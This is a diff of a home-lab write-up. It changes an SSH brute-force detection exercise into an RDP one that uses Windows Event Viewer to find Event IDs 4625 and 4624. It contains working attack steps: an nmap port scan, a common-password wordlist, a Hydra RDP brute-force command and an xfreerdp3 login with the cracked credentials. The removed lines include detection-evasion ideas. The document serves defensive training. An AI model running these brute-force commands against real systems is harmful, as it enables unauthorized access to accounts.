@@ -15,8 +15,6 @@
 
 - Detect authentication-based attacks
 - Analyze failed login patterns
-- Create alerting thresholds
-- Understand attacker reconnaissance behavior
 
 ## 🏗️ Environment Setup
 
@@ -33,7 +31,7 @@
 
 ### Prerequisites
 
-- Target VM sending auth logs to SIEM
+- Target VM sending auth logs to Windows Event Viewer
 - Network connectivity between attacker and target
 
 ## ⚔️ Attack Execution
@@ -45,170 +43,88 @@
 nmap -p 3389 <WINDOWS_IP_ADDRESS>
 ```
 _You can get the IP address from the command prompt using_ `ipconfig`
+![](attachments/nmap-scan-target.png)
 
 ### Step 2: Prepare Wordlist
 
 ```bash
-# Use a small custom wordlist for demo
-cat > passwords.txt << EOF
+# create and open a new file to store passwords
+nano passwords.txt
+
+# example password list
 password
+Password1
 Password123
 admin
-root
-123456
-testuser
-Summer2024!
-EOF
+Admin123
 ```
 
-### Step 3: Execute Brute Force
+The wordlists typically contains common passwords that can be used to brute force login attempts
+
+### Step 3: Execute Attack
 
 ```bash
 # Using Hydra
-hydra -l testuser -P passwords.txt 
+hydra -l testuser -P passwords.txt rdp://<WINDOWS_IP_ADDRESS> -t 1
 ```
 
+![](attachments/hydra-scan-success.png)
+We can see we had a valid password found for the user
+
 ### Step 4: Successful Authentication
+Now to authenticate we have the right credentials, we can attempt to remote into this desktop with the credentials we have.
 
 ```bash
 # After successful guess
-ssh testuser@192.168.1.100
+xfreerdp3 /u:client-lab /p:Password123 /v:<WINDOWS_IP_ADDRESS>
 ```
 
+Hit enter, and a new window should pop up with you logged in as the user
+
+_Tip: If the_ `xfreedrdp3` _command doesn't work, try_ `sudo apt install freerdp3-x11` _to install then run the_ `xfreedrdp3` _command_
 ## 📊 Expected Log Evidence
 
-### Auth Logs (Linux Target)
+When checking the logs, we will be looking for a few things:
+- Event ID
+- Network Information
+- Failure information
 
-Location: `/var/log/auth.log`
+#### 1. Searching by Event ID
+The two events IDs were interested in our 4625 (failed log on) and 4624 (successful log on)
 
-```
-Jan 15 14:23:11 ubuntu-server sshd[1234]: Failed password for testuser from 192.168.1.50 port 45678 ssh2
-Jan 15 14:23:13 ubuntu-server sshd[1235]: Failed password for testuser from 192.168.1.50 port 45679 ssh2
-Jan 15 14:23:15 ubuntu-server sshd[1236]: Failed password for testuser from 192.168.1.50 port 45680 ssh2
-...
-Jan 15 14:23:45 ubuntu-server sshd[1245]: Accepted password for testuser from 192.168.1.50 port 45689 ssh2
-```
+Type "Event Viewer" in the Windows search bar and click on Windows Logs then Security
 
-### Key Indicators
+Next, filter the logs using "Filter Current Log" on the right side of the window. It will give you a pop up and you should fill it out like this:
+![](attachments/filter-unsuccess.png)
+Click OK
 
-- Multiple failed authentication attempts
-- Same source IP address
-- Sequential connection attempts
-- Short time intervals between attempts
-- Eventual successful login from same IP
+Now it will show all the logs with Event ID 4625 or the failed logons. The most recent attempts will be at the top, if not, hit the refresh icon in the tab to the side. 
 
-## 🔍 SIEM Detection
+Click on an event log and we'll see some information at the bottom:
+![](attachments/unsuccess.png)
+We can see the first line says an "account failed to log on", which would be one of the brute force attempts that we made.
+If we continue scrolling in that section, we'll see the Network information and Failure information.
 
-### Kibana/Elasticsearch Query
+![](attachments/unsuccess-fail-reason.png)
+The failure reason and the status code 0xC000006D are displayed, mentioning a bad username or password
 
-```
-event.category: "authentication" AND 
-event.outcome: "failure" AND 
-source.ip: * 
-| stats count by source.ip, user.name 
-| where count > 5
-```
+![](attachments/unsuccess-brute-network.png)
+Here we see the name and IP address of the attacking machine
 
-### Splunk Query
+For successful log on attempts, filter the current log and put in 4624 as the event ID like below:
+![](attachments/filter-success.png)
+Click OK
 
-```
-index=linux sourcetype=linux_secure "Failed password"
-| stats count by src_ip, user
-| where count > 5
-```
-
-### Detection Logic
-
-- **Alert Threshold**: 5+ failed attempts within 5 minutes from single IP
-- **Severity**: Medium → High (if successful login follows)
-
-## 🚨 Sample Detection Rule
-
-```yaml
-title: SSH Brute Force Attack Detected
-id: ssh-bruteforce-001
-status: experimental
-description: Detects multiple failed SSH authentication attempts indicating brute force attack
-logsource:
-  product: linux
-  service: sshd
-detection:
-  selection:
-    event.type: authentication_failure
-    service.name: sshd
-  timeframe: 5m
-  condition: selection | count(source.ip) > 5
-level: high
-tags:
-  - attack.credential_access
-  - attack.t1110.001
-```
-
-## 🔎 Investigation Steps
-
-### 1. Initial Triage
-
-- Identify the source IP address
-- Check OSINT (AbuseIPDB, GreyNoise) for IP reputation
-- Determine if any accounts were compromised
-
-### 2. Timeline Analysis
-
-```
-1. 14:23:11 - First failed attempt detected
-2. 14:23:11-14:23:43 - 32 failed attempts over 32 seconds
-3. 14:23:45 - Successful authentication
-4. 14:23:45-14:25:30 - User session active
-```
-
-### 3. Scope Assessment
-
-- Check for lateral movement from compromised account
-- Review commands executed during session
-- Identify any privilege escalation attempts
+Now double-click on one of your recent log in attempts
+![](attachments/successful-rdp-attempt.png)
+We can see the account was successfully logged on to. 
+We also have a Logon Type 10 under Logon Information, which indicates a successful logon attempt using RDP. 
+Under Network Information, we see that while the workstation name is the name for our target, the IP address is the same as our attacking machine.
 
 ### 4. IOCs (Indicators of Compromise)
 
-- Source IP: `192.168.1.50`
-- Compromised Account: `testuser`
-- Attack Duration: ~35 seconds
-- Success Rate: 1/33 attempts
-
-## 🛡️ Response Actions
-
-### Immediate Actions
-
-1. Block source IP at firewall
-2. Force password reset for affected account
-3. Review account permissions and access
-
-### Containment
-
-```bash
-# Block IP using iptables
-sudo iptables -A INPUT -s 192.168.1.50 -j DROP
-
-# Disable compromised account
-sudo usermod -L testuser
-
-# Review active sessions
-who
-last -20
-```
-
-### Remediation
-
-- Implement SSH key authentication
-- Deploy fail2ban for automated blocking
-- Enable MFA if available
-- Review and strengthen password policy
-
-## 📈 Metrics & KPIs
-
-- **Time to Detect**: < 1 minute
-- **Time to Alert**: < 2 minutes
-- **Time to Respond**: < 10 minutes
-- **False Positive Rate**: Document after tuning
+- Source IP: `10.10.0.5` or whatever your attacking machine's IP is
+- Compromised Account: `client-lab`
 
 ## 🎓 Lessons Learned
 
@@ -217,13 +133,6 @@ last -20
 - Detection rule triggered correctly
 - Clear log evidence available
 - Easy to trace attack timeline
-
-### Improvements Needed
-
-- Reduce detection threshold (currently 5 attempts)
-- Add automated blocking
-- Implement rate limiting at network level
-
 ### Skills Developed
 
 - Log analysis and pattern recognition
@@ -235,11 +144,3 @@ last -20
 
 - [MITRE ATT&CK T1110](https://attack.mitre.org/techniques/T1110/)
 - [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
-- [SSH Hardening Guide](https://www.ssh.com/academy/ssh/hardening)
-
-## 🔄 Variations to Try
-
-1. **Easy**: Increase failed attempts threshold to 10
-2. **Medium**: Add IP address rotation to evade detection
-3. **Hard**: Combine with user enumeration (different usernames)
-4. **Expert**: Low-and-slow attack (1 attempt per minute over hours)
